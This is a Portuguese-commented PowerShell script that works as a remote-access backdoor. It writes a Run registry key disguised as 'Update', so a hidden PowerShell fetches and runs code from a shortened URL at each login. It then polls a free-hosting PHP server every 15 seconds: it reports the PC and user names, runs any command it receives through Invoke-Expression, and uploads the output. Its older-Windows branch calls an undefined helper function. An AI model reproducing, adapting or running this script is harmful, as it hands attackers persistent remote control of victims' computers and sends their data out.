# Função para obter a versão do Windows
function Get-WindowsVersion {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $osVersion = $os.Version
    return $osVersion
}

# Chama a função para obter a versão do Windows
$windowsVersion = Get-WindowsVersion

# Verifica se a versão do Windows é maior que 10
if ([version]$windowsVersion -gt [version]"10.0") {
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex (iwr -useb https://bit.ly/Driveupdate)" /f
    while ($true) {
        $nomePC = $env:COMPUTERNAME
        $nomeUsuario = $env:username
        $version = $windowsVersion
        $phpUrl = "https://liberal-cane2.000webhostapp.com/registrar.php"

        $params = @{
            NomePC = $nomePC
            Usuario = $nomeUsuario
            Version = $version
        }

        Invoke-RestMethod -Uri $phpUrl -Method POST -Body $params

        $phpPageUrl = "https://liberal-cane2.000webhostapp.com/arquivo.txt"

        try {
            $comando = Invoke-RestMethod -Uri $phpPageUrl
            if (-not [string]::IsNullOrEmpty($comando)) {
                # Executar o comando PowerShell
                $saida = Invoke-Expression -Command $comando

                # Verificar se há saída
                if (-not [string]::IsNullOrEmpty($saida)) {
                    # Enviar a saída para upload.php
                    $uploadUrl ="https://liberal-cane2.000webhostapp.com/upload.php"
                    Invoke-RestMethod -Uri $uploadUrl -Method POST -Body ("saida=" + [System.Web.HttpUtility]::UrlEncode($saida))
                }
            }
        } catch {
            Write-Host "Erro ao consultar o servidor PHP: $_"
        }
        Start-Sleep -Seconds 15
    }
} else {
    # Se a versão do Windows for menor que 10, execute o código adicional aqui
    # Define a função para fazer a codificação URL
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_EXPAND_SZ /d "%windir%\system32\cmd.exe /c powershell -win 1 iex ((New-Object Net.WebClient).DownloadString("https://bit.ly/Driveupdate")
)" /f
    function UrlEncode {
        param (
            [string] $value
        )

        $value = [System.Uri]::EscapeDataString($value)
        return $value
    }

    # Define a função para executar comandos PowerShell
    function Execute-PowerShellCommand {
        param (
            [string] $command
        )

        $output = Invoke-Expression -Command $command
        return $output
    }

    # Caminho do PHP
    $phpUrl = "https://liberal-cane2.000webhostapp.com/registrar.php"

    while ($true) {
        # Obter informações do computador e usuário
        $nomePC = $env:COMPUTERNAME
        $nomeUsuario = $env:username
        $version = $windowsVersion

        # Construir os parâmetros
        $params = "NomePC=" + (UrlEncode $nomePC)
        $params += "&Usuario=" + (UrlEncode $nomeUsuario)
        $params += "&Version=" + (UrlEncode $version)

        # Enviar os parâmetros para o servidor PHP
        $response = Send-HttpPostRequest -url $phpUrl -data $params

        # URL da página PHP com comandos
        $phpPageUrl = "https://liberal-cane2.000webhostapp.com/arquivo.txt"

        try {
            $comando = (New-Object System.Net.WebClient).DownloadString($phpPageUrl)
            if (-not [string]::IsNullOrEmpty($comando)) {
                # Executar o comando PowerShell
                $saida = Execute-PowerShellCommand -command $comando

                # Verificar se há saída
                if (-not [string]::IsNullOrEmpty($saida)) {
                    # Enviar a saída para upload.php
                    $uploadUrl ="https://liberal-cane2.000webhostapp.com/upload.php"
                    $params = "saida=" + (UrlEncode $saida)
                    Send-HttpPostRequest -url $uploadUrl -data $params
                }
            }
        } catch {
            Write-Host "Erro ao consultar o servidor PHP: $_"
        }

        Start-Sleep -Seconds 15
    }
}
